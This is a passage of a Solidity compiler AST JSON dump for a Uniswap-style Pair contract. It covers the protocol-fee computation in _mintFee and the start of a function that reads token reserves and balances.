																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1309,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1307,
																				"name": "rootK",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1289,
																				"src": "4340:5:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1308,
																				"name": "rootKLast",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1301,
																				"src": "4348:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "4340:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 1352,
																		"nodeType": "IfStatement",
																		"src": "4336:373:6",
																		"trueBody": {
																			"id": 1351,
																			"nodeType": "Block",
																			"src": "4359:350:6",
																			"statements": [
																				{
																					"assignments": [
																						1311
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1311,
																							"name": "numerator",
																							"nodeType": "VariableDeclaration",
																							"scope": 1351,
																							"src": "4381:14:6",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 1310,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4381:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1322,
																					"initialValue": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"hexValue": "38",
																								"id": 1320,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "4465:1:6",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_8_by_1",
																									"typeString": "int_const 8"
																								},
																								"value": "8"
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_rational_8_by_1",
																									"typeString": "int_const 8"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"arguments": [
																											{
																												"argumentTypes": null,
																												"id": 1316,
																												"name": "rootKLast",
																												"nodeType": "Identifier",
																												"overloadedDeclarations": [],
																												"referencedDeclaration": 1301,
																												"src": "4424:9:6",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"expression": {
																											"argumentTypes": [
																												{
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											],
																											"expression": {
																												"argumentTypes": null,
																												"id": 1314,
																												"name": "rootK",
																												"nodeType": "Identifier",
																												"overloadedDeclarations": [],
																												"referencedDeclaration": 1289,
																												"src": "4414:5:6",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"id": 1315,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"memberName": "sub",
																											"nodeType": "MemberAccess",
																											"referencedDeclaration": 2239,
																											"src": "4414:9:6",
																											"typeDescriptions": {
																												"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																												"typeString": "function (uint256,uint256) pure returns (uint256)"
																											}
																										},
																										"id": 1317,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"kind": "functionCall",
																										"lValueRequested": false,
																										"names": [],
																										"nodeType": "FunctionCall",
																										"src": "4414:20:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 1312,
																										"name": "totalSupply",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 19,
																										"src": "4398:11:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 1313,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2267,
																									"src": "4398:15:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 1318,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4398:37:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"id": 1319,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "mul",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2267,
																							"src": "4398:41:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																								"typeString": "function (uint256,uint256) pure returns (uint256)"
																							}
																						},
																						"id": 1321,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "4398:90:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4381:107:6"
																				},
																				{
																					"assignments": [
																						1324
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1324,
																							"name": "denominator",
																							"nodeType": "VariableDeclaration",
																							"scope": 1351,
																							"src": "4510:16:6",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 1323,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4510:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1335,
																					"initialValue": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"hexValue": "38",
																										"id": 1332,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "4561:1:6",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_8_by_1",
																											"typeString": "int_const 8"
																										},
																										"value": "8"
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_rational_8_by_1",
																											"typeString": "int_const 8"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 1330,
																										"name": "rootKLast",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 1301,
																										"src": "4547:9:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 1331,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2267,
																									"src": "4547:13:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 1333,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4547:16:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"hexValue": "3137",
																										"id": 1327,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "4539:2:6",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_17_by_1",
																											"typeString": "int_const 17"
																										},
																										"value": "17"
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_rational_17_by_1",
																											"typeString": "int_const 17"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 1325,
																										"name": "rootK",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 1289,
																										"src": "4529:5:6",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 1326,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2267,
																									"src": "4529:9:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 1328,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4529:13:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"id": 1329,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "add",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2217,
																							"src": "4529:17:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																								"typeString": "function (uint256,uint256) pure returns (uint256)"
																							}
																						},
																						"id": 1334,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "4529:35:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4510:54:6"
																				},
																				{
																					"assignments": [
																						1337
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1337,
																							"name": "liquidity",
																							"nodeType": "VariableDeclaration",
																							"scope": 1351,
																							"src": "4586:14:6",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 1336,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4586:4:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1341,
																					"initialValue": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1340,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1338,
																							"name": "numerator",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1311,
																							"src": "4603:9:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "/",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1339,
																							"name": "denominator",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1324,
																							"src": "4615:11:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "4603:23:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4586:40:6"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1344,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1342,
																							"name": "liquidity",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1337,
																							"src": "4652:9:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1343,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "4664:1:6",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_0_by_1",
																								"typeString": "int_const 0"
																							},
																							"value": "0"
																						},
																						"src": "4652:13:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1350,
																					"nodeType": "IfStatement",
																					"src": "4648:42:6",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 1346,
																									"name": "feeTo",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1265,
																									"src": "4673:5:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_address",
																										"typeString": "address"
																									}
																								},
																								{
																									"argumentTypes": null,
																									"id": 1347,
																									"name": "liquidity",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 1337,
																									"src": "4680:9:6",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_address",
																										"typeString": "address"
																									},
																									{
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								],
																								"id": 1345,
																								"name": "_mint",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 125,
																								"src": "4667:5:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
																									"typeString": "function (address,uint256)"
																								}
																							},
																							"id": 1348,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "functionCall",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "4667:23:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_tuple$__$",
																								"typeString": "tuple()"
																							}
																						},
																						"id": 1349,
																						"nodeType": "ExpressionStatement",
																						"src": "4667:23:6"
																					}
																				}
																			]
																		}
																	}
																]
															}
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 1367,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mintFee",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1260,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1257,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1367,
												"src": "3930:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1256,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "3930:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1259,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1367,
												"src": "3957:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1258,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "3957:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3920:60:6"
									},
									"returnParameters": {
										"id": 1263,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1262,
												"name": "feeOn",
												"nodeType": "VariableDeclaration",
												"scope": 1367,
												"src": "3998:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1261,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3998:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3997:12:6"
									},
									"scope": 2193,
									"src": "3903:893:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1511,
										"nodeType": "Block",
										"src": "4970:1200:6",
										"statements": [
											{
												"assignments": [
													1377,
													1379,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1377,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "4981:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1376,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "4981:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1379,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5000:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1378,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "5000:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1382,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1380,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1028,
														"src": "5023:11:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1381,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5023:13:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4980:56:6"
											},
											{
												"assignments": [
													1384
												],
												"declarations": [
													{
														"constant": false,
														"id": 1384,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5061:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1383,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5061:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1393,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1390,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "5110:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1389,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5102:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1391,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5102:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1386,
																	"name": "token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 968,
																	"src": "5084:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1385,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "5077:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1387,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5077:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1388,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "5077:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1392,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5077:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5061:55:6"
											},
											{
												"assignments": [
													1395
												],
												"declarations": [
													{
														"constant": false,
														"id": 1395,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5126:13:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1394,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5126:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1404,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1401,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2355,
																	"src": "5175:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Pair_$2193",
																		"typeString": "contract Pair"
																	}
																],
																"id": 1400,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5167:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1402,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5167:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1397,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 970,
																	"src": "5149:6:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1396,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 533,
																"src": "5142:6:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1398,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5142:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$533",
																"typeString": "contract IERC20"
															}
														},
														"id": 1399,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 494,
														"src": "5142:24:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1403,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5142:39:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5126:55:6"
											},
											{
												"assignments": [
													1406
												],
												"declarations": [
													{
														"constant": false,
														"id": 1406,
														"name": "amount0",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5191:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1405,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5191:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1411,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1409,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1377,
															"src": "5219:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1407,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1384,
															"src": "5206:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1408,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2239,
														"src": "5206:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1410,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5206:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
